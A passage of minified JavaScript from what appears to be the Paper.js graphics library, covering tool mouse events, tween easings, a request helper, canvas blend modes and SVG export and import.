                return "{ type: " + this.type + ", point: " + this.getPoint() + ", count: " + this.getCount() + ", modifiers: " + this.getModifiers() + " }";
            },
        }),
        J =
            (a.extend({
                _class: "Tool",
                _list: "tools",
                _reference: "tool",
                _events: ["onMouseDown", "onMouseUp", "onMouseDrag", "onMouseMove", "onActivate", "onDeactivate", "onEditOptions", "onKeyDown", "onKeyUp"],
                initialize: function (t) {
                    a.call(this), (this._moveCount = -1), (this._downCount = -1), this.set(t);
                },
                getMinDistance: function () {
                    return this._minDistance;
                },
                setMinDistance: function (t) {
                    (this._minDistance = t), null != t && null != this._maxDistance && t > this._maxDistance && (this._maxDistance = t);
                },
                getMaxDistance: function () {
                    return this._maxDistance;
                },
                setMaxDistance: function (t) {
                    (this._maxDistance = t), null != this._minDistance && null != t && t < this._minDistance && (this._minDistance = t);
                },
                getFixedDistance: function () {
                    return this._minDistance == this._maxDistance ? this._minDistance : null;
                },
                setFixedDistance: function (t) {
                    this._minDistance = this._maxDistance = t;
                },
                _handleMouseEvent: function (t, e, i, n) {
                    (st = this._scope), n.drag && !this.responds(t) && (t = "mousemove");
                    var s = n.move || n.drag,
                        r = this.responds(t),
                        o = this.minDistance,
                        a = this.maxDistance,
                        l = !1,
                        h = this;
                    function u(t, e) {
                        var r = i,
                            o = s ? h._point : h._downPoint || r;
                        if (s) {
                            if (h._moveCount >= 0 && r.equals(o)) return !1;
                            if (o && (null != t || null != e)) {
                                var a = r.subtract(o),
                                    l = a.getLength();
                                if (l < (t || 0)) return !1;
                                e && (r = o.add(a.normalize(Math.min(l, e))));
                            }
                            h._moveCount++;
                        }
                        return (h._point = r), (h._lastPoint = o || r), n.down && ((h._moveCount = -1), (h._downPoint = r), h._downCount++), !0;
                    }
                    function c() {
                        r && (l = h.emit(t, new X(h, t, e)) || l);
                    }
                    if (n.down) u(), c();
                    else if (n.up) u(null, a), c();
                    else if (r) for (; u(o, a); ) c();
                    return l;
                },
            }),
            s.extend(r, {
                _class: "Tween",
                statics: {
                    easings: {
                        linear: function (t) {
                            return t;
                        },
                        easeInQuad: function (t) {
                            return t * t;
                        },
                        easeOutQuad: function (t) {
                            return t * (2 - t);
                        },
                        easeInOutQuad: function (t) {
                            return t < 0.5 ? 2 * t * t : 2 * (2 - t) * t - 1;
                        },
                        easeInCubic: function (t) {
                            return t * t * t;
                        },
                        easeOutCubic: function (t) {
                            return --t * t * t + 1;
                        },
                        easeInOutCubic: function (t) {
                            return t < 0.5 ? 4 * t * t * t : (t - 1) * (2 * t - 2) * (2 * t - 2) + 1;
                        },
                        easeInQuart: function (t) {
                            return t * t * t * t;
                        },
                        easeOutQuart: function (t) {
                            return 1 - --t * t * t * t;
                        },
                        easeInOutQuart: function (t) {
                            return t < 0.5 ? 8 * t * t * t * t : 1 - 8 * --t * t * t * t;
                        },
                        easeInQuint: function (t) {
                            return t * t * t * t * t;
                        },
                        easeOutQuint: function (t) {
                            return 1 + --t * t * t * t * t;
                        },
                        easeInOutQuint: function (t) {
                            return t < 0.5 ? 16 * t * t * t * t * t : 1 + 16 * --t * t * t * t * t;
                        },
                    },
                },
                initialize: function t(e, i, n, s, r, o) {
                    this.object = e;
                    var a = typeof r,
                        l = "function" === a;
                    (this.type = l ? a : "string" === a ? r : "linear"), (this.easing = l ? r : t.easings[this.type]), (this.duration = s), (this.running = !1), (this._then = null), (this._startTime = null);
                    var h = i || n;
                    (this._keys = h ? Object.keys(h) : []), (this._parsedKeys = this._parseKeys(this._keys)), (this._from = h && this._getState(i)), (this._to = h && this._getState(n)), !1 !== o && this.start();
                },
                then: function (t) {
                    return (this._then = t), this;
                },
                start: function () {
                    return (this._startTime = null), (this.running = !0), this;
                },
                stop: function () {
                    return (this.running = !1), this;
                },
                update: function (t) {
                    if (this.running) {
                        t > 1 && ((t = 1), (this.running = !1));
                        for (
                            var e = this.easing(t),
                                i = this._keys,
                                n = function (i) {
                                    return "function" == typeof i ? i(e, t) : i;
                                },
                                r = 0,
                                o = i && i.length;
                            r < o;
                            r++
                        ) {
                            var a = i[r],
                                l = n(this._from[a]),
                                h = n(this._to[a]),
                                u = l && h && l.__add && h.__add ? h.__subtract(l).__multiply(e).__add(l) : (h - l) * e + l;
                            this._setProperty(this._parsedKeys[a], u);
                        }
                        !this.running && this._then && this._then(this.object), this.responds("update") && this.emit("update", new s({ progress: t, factor: e }));
                    }
                    return this;
                },
                _events: { onUpdate: {} },
                _handleFrame: function (t) {
                    var e = this._startTime,
                        i = e ? (t - e) / this.duration : 0;
                    e || (this._startTime = t), this.update(i);
                },
                _getState: function (t) {
                    for (var e = this._keys, i = {}, n = 0, s = e.length; n < s; n++) {
                        var r,
                            o = e[n],
                            a = this._parsedKeys[o],
                            l = this._getProperty(a);
                        if (t) {
                            var h = this._resolveValue(l, t[o]);
                            this._setProperty(a, h), (r = (r = this._getProperty(a)) && r.clone ? r.clone() : r), this._setProperty(a, l);
                        } else r = l && l.clone ? l.clone() : l;
                        i[o] = r;
                    }
                    return i;
                },
                _resolveValue: function (t, e) {
                    if (e) {
                        if (Array.isArray(e) && 2 === e.length) {
                            var i = e[0];
                            return i && i.match && i.match(/^[+\-*/]=/) ? this._calculate(t, i[0], e[1]) : e;
                        }
                        if ("string" == typeof e) {
                            var n = e.match(/^[+\-*/]=(.*)/);
                            if (n) {
                                var s = JSON.parse(n[1].replace(/(['"])?([a-zA-Z0-9_]+)(['"])?:/g, '"$2": '));
                                return this._calculate(t, e[0], s);
                            }
                        }
                    }
                    return e;
                },
                _calculate: function (t, e, i) {
                    return st.PaperScript.calculateBinary(t, e, i);
                },
                _parseKeys: function (t) {
                    for (var e = {}, i = 0, n = t.length; i < n; i++) {
                        var s = t[i],
                            r = s.replace(/\.([^.]*)/g, "/$1").replace(/\[['"]?([^'"\]]*)['"]?\]/g, "/$1");
                        e[s] = r.split("/");
                    }
                    return e;
                },
                _getProperty: function (t, e) {
                    for (var i = this.object, n = 0, s = t.length - (e || 0); n < s && i; n++) i = i[t[n]];
                    return i;
                },
                _setProperty: function (t, e) {
                    var i = this._getProperty(t, 1);
                    i && (i[t[t.length - 1]] = e);
                },
            })),
        K = {
            request: function (e) {
                var i = new t.XMLHttpRequest();
                return (
                    i.open((e.method || "get").toUpperCase(), e.url, s.pick(e.async, !0)),
                    e.mimeType && i.overrideMimeType(e.mimeType),
                    (i.onload = function () {
                        var t = i.status;
                        0 === t || 200 === t ? e.onLoad && e.onLoad.call(i, i.responseText) : i.onerror();
                    }),
                    (i.onerror = function () {
                        var t = i.status,
                            n = 'Could not load "' + e.url + '" (Status: ' + t + ")";
                        if (!e.onError) throw new Error(n);
                        e.onError(n, t);
                    }),
                    i.send(null)
                );
            },
        },
        tt = {
            canvases: [],
            getCanvas: function (t, e) {
                if (!i) return null;
                var s,
                    r = !0;
                "object" == typeof t && ((e = t.height), (t = t.width)), this.canvases.length ? (s = this.canvases.pop()) : ((s = n.createElement("canvas")), (r = !1));
                var o = s.getContext("2d");
                if (!o) throw new Error("Canvas " + s + " is unable to provide a 2D context.");
                return s.width === t && s.height === e ? r && o.clearRect(0, 0, t + 1, e + 1) : ((s.width = t), (s.height = e)), o.save(), s;
            },
            getContext: function (t, e) {
                var i = this.getCanvas(t, e);
                return i ? i.getContext("2d") : null;
            },
            release: function (t) {
                var e = t && t.canvas ? t.canvas : t;
                e && e.getContext && (e.getContext("2d").restore(), this.canvases.push(e));
            },
        },
        et = new (function () {
            var t,
                e,
                i,
                n,
                r,
                o,
                a,
                l,
                h,
                u,
                c,
                d = Math.min,
                f = Math.max,
                p = Math.abs;
            function g(t, e, i) {
                return 0.2989 * t + 0.587 * e + 0.114 * i;
            }
            function v(t, e, i, n) {
                var s = n - g(t, e, i),
                    r = ((n = g((h = t + s), (u = e + s), (c = i + s))), d(h, u, c)),
                    o = f(h, u, c);
                if (r < 0) {
                    var a = n - r;
                    (h = n + ((h - n) * n) / a), (u = n + ((u - n) * n) / a), (c = n + ((c - n) * n) / a);
                }
                if (o > 255) {
                    var l = 255 - n,
                        p = o - n;
                    (h = n + ((h - n) * l) / p), (u = n + ((u - n) * l) / p), (c = n + ((c - n) * l) / p);
                }
            }
            function m(t, e, i) {
                return f(t, e, i) - d(t, e, i);
            }
            function _(t, e, i, n) {
                var s,
                    r = [t, e, i],
                    o = f(t, e, i),
                    a = d(t, e, i);
                (s = 0 === d((a = a === t ? 0 : a === e ? 1 : 2), (o = o === t ? 0 : o === e ? 1 : 2)) ? (1 === f(a, o) ? 2 : 1) : 0),
                    r[o] > r[a] ? ((r[s] = ((r[s] - r[a]) * n) / (r[o] - r[a])), (r[o] = n)) : (r[s] = r[o] = 0),
                    (r[a] = 0),
                    (h = r[0]),
                    (u = r[1]),
                    (c = r[2]);
            }
            var y = {
                    multiply: function () {
                        (h = (r * t) / 255), (u = (o * e) / 255), (c = (a * i) / 255);
                    },
                    screen: function () {
                        (h = r + t - (r * t) / 255), (u = o + e - (o * e) / 255), (c = a + i - (a * i) / 255);
                    },
                    overlay: function () {
                        (h = r < 128 ? (2 * r * t) / 255 : 255 - (2 * (255 - r) * (255 - t)) / 255),
                            (u = o < 128 ? (2 * o * e) / 255 : 255 - (2 * (255 - o) * (255 - e)) / 255),
                            (c = a < 128 ? (2 * a * i) / 255 : 255 - (2 * (255 - a) * (255 - i)) / 255);
                    },
                    "soft-light": function () {
                        var n = (t * r) / 255;
                        (h = n + (r * (255 - ((255 - r) * (255 - t)) / 255 - n)) / 255),
                            (u = (n = (e * o) / 255) + (o * (255 - ((255 - o) * (255 - e)) / 255 - n)) / 255),
                            (c = (n = (i * a) / 255) + (a * (255 - ((255 - a) * (255 - i)) / 255 - n)) / 255);
                    },
                    "hard-light": function () {
                        (h = t < 128 ? (2 * t * r) / 255 : 255 - (2 * (255 - t) * (255 - r)) / 255),
                            (u = e < 128 ? (2 * e * o) / 255 : 255 - (2 * (255 - e) * (255 - o)) / 255),
                            (c = i < 128 ? (2 * i * a) / 255 : 255 - (2 * (255 - i) * (255 - a)) / 255);
                    },
                    "color-dodge": function () {
                        (h = 0 === r ? 0 : 255 === t ? 255 : d(255, (255 * r) / (255 - t))), (u = 0 === o ? 0 : 255 === e ? 255 : d(255, (255 * o) / (255 - e))), (c = 0 === a ? 0 : 255 === i ? 255 : d(255, (255 * a) / (255 - i)));
                    },
                    "color-burn": function () {
                        (h = 255 === r ? 255 : 0 === t ? 0 : f(0, 255 - (255 * (255 - r)) / t)),
                            (u = 255 === o ? 255 : 0 === e ? 0 : f(0, 255 - (255 * (255 - o)) / e)),
                            (c = 255 === a ? 255 : 0 === i ? 0 : f(0, 255 - (255 * (255 - a)) / i));
                    },
                    darken: function () {
                        (h = r < t ? r : t), (u = o < e ? o : e), (c = a < i ? a : i);
                    },
                    lighten: function () {
                        (h = r > t ? r : t), (u = o > e ? o : e), (c = a > i ? a : i);
                    },
                    difference: function () {
                        (h = r - t) < 0 && (h = -h), (u = o - e) < 0 && (u = -u), (c = a - i) < 0 && (c = -c);
                    },
                    exclusion: function () {
                        (h = r + (t * (255 - r - r)) / 255), (u = o + (e * (255 - o - o)) / 255), (c = a + (i * (255 - a - a)) / 255);
                    },
                    hue: function () {
                        _(t, e, i, m(r, o, a)), v(h, u, c, g(r, o, a));
                    },
                    saturation: function () {
                        _(r, o, a, m(t, e, i)), v(h, u, c, g(r, o, a));
                    },
                    luminosity: function () {
                        v(r, o, a, g(t, e, i));
                    },
                    color: function () {
                        v(t, e, i, g(r, o, a));
                    },
                    add: function () {
                        (h = d(r + t, 255)), (u = d(o + e, 255)), (c = d(a + i, 255));
                    },
                    subtract: function () {
                        (h = f(r - t, 0)), (u = f(o - e, 0)), (c = f(a - i, 0));
                    },
                    average: function () {
                        (h = (r + t) / 2), (u = (o + e) / 2), (c = (a + i) / 2);
                    },
                    negation: function () {
                        (h = 255 - p(255 - t - r)), (u = 255 - p(255 - e - o)), (c = 255 - p(255 - i - a));
                    },
                },
                w = (this.nativeModes = s.each(
                    ["source-over", "source-in", "source-out", "source-atop", "destination-over", "destination-in", "destination-out", "destination-atop", "lighter", "darker", "copy", "xor"],
                    function (t) {
                        this[t] = !0;
                    },
                    {}
                )),
                x = tt.getContext(1, 1);
            x &&
                (s.each(y, function (t, e) {
                    var i = "darken" === e,
                        n = !1;
                    x.save();
                    try {
                        (x.fillStyle = i ? "#300" : "#a00"),
                            x.fillRect(0, 0, 1, 1),
                            (x.globalCompositeOperation = e),
                            x.globalCompositeOperation === e && ((x.fillStyle = i ? "#a00" : "#300"), x.fillRect(0, 0, 1, 1), (n = x.getImageData(0, 0, 1, 1).data[0] !== i ? 170 : 51));
                    } catch (t) {}
                    x.restore(), (w[e] = n);
                }),
                tt.release(x)),
                (this.process = function (s, d, f, p, g) {
                    var v = d.canvas,
                        m = "normal" === s;
                    if (m || w[s]) f.save(), f.setTransform(1, 0, 0, 1, 0, 0), (f.globalAlpha = p), m || (f.globalCompositeOperation = s), f.drawImage(v, g.x, g.y), f.restore();
                    else {
                        var _ = y[s];
                        if (!_) return;
                        for (var x = f.getImageData(g.x, g.y, v.width, v.height), b = x.data, S = d.getImageData(0, 0, v.width, v.height).data, C = 0, T = b.length; C < T; C += 4) {
                            (t = S[C]), (r = b[C]), (e = S[C + 1]), (o = b[C + 1]), (i = S[C + 2]), (a = b[C + 2]), (n = S[C + 3]), (l = b[C + 3]), _();
                            var k = (n * p) / 255,
                                I = 1 - k;
                            (b[C] = k * h + I * r), (b[C + 1] = k * u + I * o), (b[C + 2] = k * c + I * a), (b[C + 3] = n * p + I * l);
                        }
                        f.putImageData(x, g.x, g.y);
                    }
                });
        })(),
        it = new (function () {
            var t = "http://www.w3.org/2000/svg",
                e = "http://www.w3.org/2000/xmlns",
                i = "http://www.w3.org/1999/xlink",
                s = { href: i, xlink: e, xmlns: e + "/", "xmlns:xlink": e + "/" };
            function r(t, e, i) {
                for (var n in e) {
                    var r = e[n],
                        o = s[n];
                    "number" == typeof r && i && (r = i.number(r)), o ? t.setAttributeNS(o, n, r) : t.setAttribute(n, r);
                }
                return t;
            }
            return {
                svg: t,
                xmlns: e,
                xlink: i,
                create: function (e, i, s) {
                    return r(n.createElementNS(t, e), i, s);
                },
                get: function (t, e) {
                    var i = s[e],
                        n = i ? t.getAttributeNS(i, e) : t.getAttribute(e);
                    return "null" === n ? null : n;
                },
                set: r,
            };
        })(),
        nt = s.each(
            {
                fillColor: ["fill", "color"],
                fillRule: ["fill-rule", "string"],
                strokeColor: ["stroke", "color"],
                strokeWidth: ["stroke-width", "number"],
                strokeCap: ["stroke-linecap", "string"],
                strokeJoin: ["stroke-linejoin", "string"],
                strokeScaling: [
                    "vector-effect",
                    "lookup",
                    { true: "none", false: "non-scaling-stroke" },
                    function (t, e) {
                        return !e && (t instanceof A || t instanceof S || t instanceof D);
                    },
                ],
                miterLimit: ["stroke-miterlimit", "number"],
                dashArray: ["stroke-dasharray", "array"],
                dashOffset: ["stroke-dashoffset", "number"],
                fontFamily: ["font-family", "string"],
                fontWeight: ["font-weight", "string"],
                fontSize: ["font-size", "number"],
                justification: ["text-anchor", "lookup", { left: "start", center: "middle", right: "end" }],
                opacity: ["opacity", "number"],
                blendMode: ["mix-blend-mode", "style"],
            },
            function (t, e) {
                var i = s.capitalize(e),
                    n = t[2];
                this[e] = {
                    type: t[1],
                    property: e,
                    attribute: t[0],
                    toSVG: n,
                    fromSVG:
                        n &&
                        s.each(
                            n,
                            function (t, e) {
                                this[t] = e;
                            },
                            {}
                        ),
                    exportFilter: t[3],
                    get: "get" + i,
                    set: "set" + i,
                };
            },
            {}
        );
    new (function () {
        var e;
        function i(t, i, n) {
            var r = new s(),
                o = t.getTranslation();
            if (i) {
                var a = (t = t._shiftless())._inverseTransform(o);
                (r[n ? "cx" : "x"] = a.x), (r[n ? "cy" : "y"] = a.y), (o = null);
            }
            if (!t.isIdentity()) {
                var l = t.decompose();
                if (l) {
                    var u = [],
                        c = l.rotation,
                        d = l.scaling,
                        f = l.skewing;
                    o && !o.isZero() && u.push("translate(" + e.point(o) + ")"),
                        c && u.push("rotate(" + e.number(c) + ")"),
                        (h.isZero(d.x - 1) && h.isZero(d.y - 1)) || u.push("scale(" + e.point(d) + ")"),
                        f.x && u.push("skewX(" + e.number(f.x) + ")"),
                        f.y && u.push("skewY(" + e.number(f.y) + ")"),
                        (r.transform = u.join(" "));
                } else r.transform = "matrix(" + t.getValues().join(",") + ")";
            }
            return r;
        }
        function n(t, n) {
            for (var s = i(t._matrix), r = t._children, o = it.create("g", s, e), a = 0, l = r.length; a < l; a++) {
                var h = r[a],
                    u = v(h, n);
                if (u)
                    if (h.isClipMask()) {
                        var c = it.create("clipPath");
                        c.appendChild(u), f(h, c, "clip"), it.set(o, { "clip-path": "url(#" + c.id + ")" });
                    } else o.appendChild(u);
            }
            return o;
        }
        function r(t) {
            var n = t._type,
                s = t._radius,
                r = i(t._matrix, !0, "rectangle" !== n);
            if ("rectangle" === n) {
                n = "rect";
                var o = t._size,
                    a = o.width,
                    l = o.height;
                (r.x -= a / 2), (r.y -= l / 2), (r.width = a), (r.height = l), s.isZero() && (s = null);
            }
            return s && ("circle" === n ? (r.r = s) : ((r.rx = s.width), (r.ry = s.height))), it.create(n, r, e);
        }
        var o,
            a = {
                Group: n,
                Layer: n,
                Raster: function (t, n) {
                    var s = i(t._matrix, !0),
                        r = t.getSize(),
                        o = t.getImage();
                    return (s.x -= r.width / 2), (s.y -= r.height / 2), (s.width = r.width), (s.height = r.height), (s.href = (0 == n.embedImages && o && o.src) || t.toDataURL()), it.create("image", s, e);
                },
                Path: function (t, n) {
                    var s = n.matchShapes;
                    if (s) {
                        var o = t.toShape(!1);
                        if (o) return r(o);
                    }
                    var a,
                        l = t._segments,
                        h = l.length,
                        u = i(t._matrix);
                    if (s && h >= 2 && !t.hasHandles())
                        if (h > 2) {
                            a = t._closed ? "polygon" : "polyline";
                            for (var c = [], d = 0; d < h; d++) c.push(e.point(l[d]._point));
                            u.points = c.join(" ");
                        } else {
                            a = "line";
                            var f = l[0]._point,
                                p = l[1]._point;
                            u.set({ x1: f.x, y1: f.y, x2: p.x, y2: p.y });
                        }
                    else (a = "path"), (u.d = t.getPathData(null, n.precision));
                    return it.create(a, u, e);
                },
                Shape: r,
                CompoundPath: function (t, n) {
                    var s = i(t._matrix),
                        r = t.getPathData(null, n.precision);
                    return r && (s.d = r), it.create("path", s, e);
                },
                SymbolItem: function (t, n) {
                    var s = i(t._matrix, !0),
                        r = t._definition,
                        o = d(r, "symbol"),
                        a = r._item,
                        l = a.getBounds();
                    return (
                        o || ((o = it.create("symbol", { viewBox: e.rectangle(l) })).appendChild(v(a, n)), f(r, o, "symbol")),
                        (s.href = "#" + o.id),
                        (s.x += l.x),
                        (s.y += l.y),
                        (s.width = l.width),
                        (s.height = l.height),
                        (s.overflow = "visible"),
                        it.create("use", s, e)
                    );
                },
                PointText: function (t) {
                    var n = it.create("text", i(t._matrix, !0), e);
                    return (n.textContent = t._content), n;
                },
            };
        function c(t, i, n) {
            var r = {},
                o = !n && t.getParent(),
                a = [];
            return (
                null != t._name && (r.id = t._name),
                s.each(nt, function (i) {
                    var n = i.get,
                        l = i.type,
                        h = t[n]();
                    if (i.exportFilter ? i.exportFilter(t, h) : !o || !s.equals(o[n](), h)) {
                        if ("color" === l && null != h) {
                            var u = h.getAlpha();
                            u < 1 && (r[i.attribute + "-opacity"] = u);
                        }
                        "style" === l
                            ? a.push(i.attribute + ": " + h)
                            : (r[i.attribute] =
                                  null == h
                                      ? "none"
                                      : "color" === l
                                      ? h.gradient
                                          ? (function (t) {
                                                var i = d(t, "color");
                                                if (!i) {
                                                    var n,
                                                        s = t.getGradient(),
                                                        r = s._radial,
                                                        o = t.getOrigin(),
                                                        a = t.getDestination();
                                                    if (r) {
                                                        n = { cx: o.x, cy: o.y, r: o.getDistance(a) };
                                                        var l = t.getHighlight();
                                                        l && ((n.fx = l.x), (n.fy = l.y));
                                                    } else n = { x1: o.x, y1: o.y, x2: a.x, y2: a.y };
                                                    (n.gradientUnits = "userSpaceOnUse"), (i = it.create((r ? "radial" : "linear") + "Gradient", n, e));
                                                    for (var h = s._stops, u = 0, c = h.length; u < c; u++) {
                                                        var p = h[u],
                                                            g = p._color,
                                                            v = g.getAlpha(),
                                                            m = p._offset;
                                                        (n = { offset: null == m ? u / (c - 1) : m }), g && (n["stop-color"] = g.toCSS(!0)), v < 1 && (n["stop-opacity"] = v), i.appendChild(it.create("stop", n, e));
                                                    }
                                                    f(t, i, "color");
                                                }
                                                return "url(#" + i.id + ")";
                                            })(h)
                                          : h.toCSS(!0)
                                      : "array" === l
                                      ? h.join(",")
                                      : "lookup" === l
                                      ? i.toSVG[h]
                                      : h);
                    }
                }),
                a.length && (r.style = a.join(";")),
                1 === r.opacity && delete r.opacity,
                t._visible || (r.visibility = "hidden"),
                it.set(i, r, e)
            );
        }
        function d(t, e) {
            return o || (o = { ids: {}, svgs: {} }), t && o.svgs[e + "-" + (t._id || t.__id || (t.__id = u.get("svg")))];
        }
        function f(t, e, i) {
            o || d();
            var n = (o.ids[i] = (o.ids[i] || 0) + 1);
            (e.id = i + "-" + n), (o.svgs[i + "-" + (t._id || t.__id)] = e);
        }
        function p(e, i) {
            var n = e,
                s = null;
            if (o) {
                for (var r in ((n = "svg" === e.nodeName.toLowerCase() && e), o.svgs)) s || (n || (n = it.create("svg")).appendChild(e), (s = n.insertBefore(it.create("defs"), n.firstChild))), s.appendChild(o.svgs[r]);
                o = null;
            }
            return i.asString ? new t.XMLSerializer().serializeToString(n) : n;
        }
        function v(t, e, i) {
            var n = a[t._class],
                s = n && n(t, e);
            if (s) {
                var r = e.onExport;
                r && (s = r(t, s, e) || s);
                var o = JSON.stringify(t._data);
                o && "{}" !== o && "null" !== o && s.setAttribute("data-paper-data", o);
            }
            return s && c(t, s, i);
        }
        function _(t) {
            return t || (t = {}), (e = new l(t.precision)), t;
        }
        w.inject({
            exportSVG: function (t) {
                return p(v(this, (t = _(t)), !0), t);
            },
        }),
            y.inject({
                exportSVG: function (t) {
                    t = _(t);
                    var n = this._children,
                        r = this.getView(),
                        o = s.pick(t.bounds, "view"),
                        a = t.matrix || ("view" === o && r._matrix),
                        l = a && m.read([a]),
                        h = "view" === o ? new g([0, 0], r.getViewSize()) : "content" === o ? w._getBounds(n, l, { stroke: !0 }).rect : g.read([o], 0, { readNull: !0 }),
                        u = { version: "1.1", xmlns: it.svg, "xmlns:xlink": it.xlink };
                    h && ((u.width = h.width), (u.height = h.height), (h.x || h.y) && (u.viewBox = e.rectangle(h)));
                    var c = it.create("svg", u, e),
                        d = c;
                    l && !l.isIdentity() && (d = c.appendChild(it.create("g", i(l), e)));
                    for (var f = 0, y = n.length; f < y; f++) d.appendChild(v(n[f], t, !0));
                    return p(c, t);
                },
            });
    })(),
        new (function () {
            var r,
                o = {};
            function a(t, e, i, n, s) {
                var o = it.get(t, e),
                    a = null == o ? (n ? null : i ? "" : 0) : i ? o : parseFloat(o);
                return /%\s*$/.test(o) ? (a / 100) * (s ? 1 : r[/x|^width/.test(e) ? "width" : "height"]) : a;
            }
            function l(t, e, i, n, s) {
                return (e = a(t, e || "x", !1, n, s)), (i = a(t, i || "y", !1, n, s)), !n || (null != e && null != i) ? new c(e, i) : null;
            }
            function h(t, e, i, n, s) {
                return (e = a(t, e || "width", !1, n, s)), (i = a(t, i || "height", !1, n, s)), !n || (null != e && null != i) ? new f(e, i) : null;
            }
            function u(t, e, i) {
                return "none" === t ? null : "number" === e ? parseFloat(t) : "array" === e ? (t ? t.split(/[\s,]+/g).map(parseFloat) : []) : "color" === e ? M(t) || t : "lookup" === e ? i[t] : t;
            }
            function d(t, e, i, n) {
                var s = t.childNodes,
                    r = "clippath" === e,
                    o = "defs" === e,
                    a = new x(),
                    l = a._project,
                    h = l._currentStyle,
                    u = [];
                if ((r || o || ((a = P(a, t, n)), (l._currentStyle = a._style.clone())), n)) for (var c = t.querySelectorAll("defs"), d = 0, f = c.length; d < f; d++) z(c[d], i, !1);
                for (d = 0, f = s.length; d < f; d++) {
                    var p,
                        g = s[d];
                    1 !== g.nodeType || /^defs$/i.test(g.nodeName) || !(p = z(g, i, !1)) || p instanceof k || u.push(p);
                }
                return a.addChildren(u), r && (a = P(a.reduce(), t, n)), (l._currentStyle = h), (r || o) && (a.remove(), (a = null)), a;
            }
            function p(t, e) {
                for (var i = t.getAttribute("points").match(/[+-]?(?:\d*\.\d+|\d+\.?)(?:[eE][+-]?\d+)?/g), n = [], s = 0, r = i.length; s < r; s += 2) n.push(new c(parseFloat(i[s]), parseFloat(i[s + 1])));
                var o = new E(n);
                return "polygon" === e && o.closePath(), o;
            }
            function v(t, e) {
                var i,
                    n = (a(t, "href", !0) || "").substring(1),
                    s = "radialgradient" === e;
                if (n) (i = o[n].getGradient())._radial ^ s && ((i = i.clone())._radial = s);
                else {
                    for (var r = t.childNodes, h = [], u = 0, c = r.length; u < c; u++) {
                        var d = r[u];
                        1 === d.nodeType && h.push(P(new H(), d));
                    }
                    i = new B(h, s);
                }
                var f,
                    p,
                    g,
                    v = "userSpaceOnUse" !== a(t, "gradientUnits", !0);
                return (
                    s ? ((p = (f = l(t, "cx", "cy", !1, v)).add(a(t, "r", !1, !1, v), 0)), (g = l(t, "fx", "fy", !0, v))) : ((f = l(t, "x1", "y1", !1, v)), (p = l(t, "x2", "y2", !1, v))), (P(new F(i, f, p, g), t)._scaleToBounds = v), null
                );
            }
            var _ = {
                "#document": function (t, e, i, n) {
                    for (var s = t.childNodes, r = 0, o = s.length; r < o; r++) {
                        var a = s[r];
                        if (1 === a.nodeType) return z(a, i, n);
                    }
                },
                g: d,
                svg: d,
                clippath: d,
                polygon: p,
                polyline: p,
                path: function (t) {
                    return A.create(t.getAttribute("d"));
                },
                lineargradient: v,
                radialgradient: v,
                image: function (t) {
                    var e = new C(a(t, "href", !0));
                    return (
                        e.on("load", function () {
                            var e = h(t);
                            this.setSize(e);
                            var i = l(t).add(e.divide(2));
                            this._matrix.append(new m().translate(i));
                        }),
                        e
                    );
                },
                symbol: function (t, e, i, n) {
                    return new k(d(t, e, i, n), !0);
                },
                defs: d,
                use: function (t) {
                    var e = (a(t, "href", !0) || "").substring(1),
                        i = o[e],
                        n = l(t);
                    return i ? (i instanceof k ? i.place(n) : i.clone().translate(n)) : null;
                },
                circle: function (t) {
                    return new S.Circle(l(t, "cx", "cy"), a(t, "r"));
                },
                ellipse: function (t) {
                    return new S.Ellipse({ center: l(t, "cx", "cy"), radius: h(t, "rx", "ry") });
                },
                rect: function (t) {
                    return new S.Rectangle(new g(l(t), h(t)), h(t, "rx", "ry"));
                },
                line: function (t) {
                    return new E.Line(l(t, "x1", "y1"), l(t, "x2", "y2"));
                },
                text: function (t) {
                    var e = new N(l(t).add(l(t, "dx", "dy")));
                    return e.setContent(t.textContent.trim() || ""), e;
                },
            };
            function b(t, e, i, n) {
                if (t.transform) {
                    for (var s = (n.getAttribute(i) || "").split(/\)\s*/g), r = new m(), o = 0, a = s.length; o < a; o++) {
                        var l = s[o];
                        if (!l) break;
                        for (var h = l.split(/\(\s*/), u = h[0], c = h[1].split(/[\s,]+/g), d = 0, f = c.length; d < f; d++) c[d] = parseFloat(c[d]);
                        switch (u) {
                            case "matrix":
                                r.append(new m(c[0], c[1], c[2], c[3], c[4], c[5]));
                                break;
                            case "rotate":
                                r.rotate(c[0], c[1] || 0, c[2] || 0);
                                break;
                            case "translate":
                                r.translate(c[0], c[1] || 0);
                                break;
                            case "scale":
                                r.scale(c);
                                break;
                            case "skewX":
                                r.skew(c[0], 0);
                                break;
                            case "skewY":
                                r.skew(0, c[0]);
                        }
                    }
                    t.transform(r);
                }
            }
            function T(t, e, i) {
                var n = "fill-opacity" === i ? "getFillColor" : "getStrokeColor",
                    s = t[n] && t[n]();
                s && s.setAlpha(parseFloat(e));
            }
            var I = s.set(
                s.each(
                    nt,
                    function (t) {
                        this[t.attribute] = function (e, i) {
                            if (e[t.set] && (e[t.set](u(i, t.type, t.fromSVG)), "color" === t.type)) {
                                var n = e[t.get]();
                                if (n && n._scaleToBounds) {
                                    var s = e.getBounds();
                                    n.transform(new m().translate(s.getPoint()).scale(s.getSize()));
                                }
                            }
                        };
                    },
                    {}
                ),
                {
                    id: function (t, e) {
                        (o[e] = t), t.setName && t.setName(e);
                    },
                    "clip-path": function (t, e) {
                        var i = M(e);
                        if (i) {
                            if (((i = i.clone()).setClipMask(!0), !(t instanceof x))) return new x(i, t);
                            t.insertChild(0, i);
                        }
                    },
                    gradientTransform: b,
                    transform: b,
                    "fill-opacity": T,
                    "stroke-opacity": T,
                    visibility: function (t, e) {
                        t.setVisible && t.setVisible("visible" === e);
                    },
                    display: function (t, e) {
                        t.setVisible && t.setVisible(null !== e);
                    },
                    "stop-color": function (t, e) {
                        t.setColor && t.setColor(e);
                    },
                    "stop-opacity": function (t, e) {
                        t._color && t._color.setAlpha(parseFloat(e));
                    },
                    offset: function (t, e) {
                        if (t.setOffset) {
                            var i = e.match(/(.*)%$/);
                            t.setOffset(i ? i[1] / 100 : parseFloat(e));
                        }
                    },
                    viewBox: function (t, e, i, n, s) {
                        var r,
                            o = new g(u(e, "array")),
                            a = h(n, null, null, !0);
                        if (t instanceof x) {
                            var l = a ? a.divide(o.getSize()) : 1,
                                c = new m().scale(l).translate(o.getPoint().negate());
                            r = t;
                        } else t instanceof k && (a && o.setSize(a), (r = t._item));
                        if (r) {
                            if ("visible" !== O(n, "overflow", s)) {
                                var d = new S.Rectangle(o);
                                d.setClipMask(!0), r.addChild(d);
                            }
                            c && r.transform(c);
                        }
                    },
                }
            );
            function O(t, i, n) {
                var r = t.attributes[i],
                    o = r && r.value;
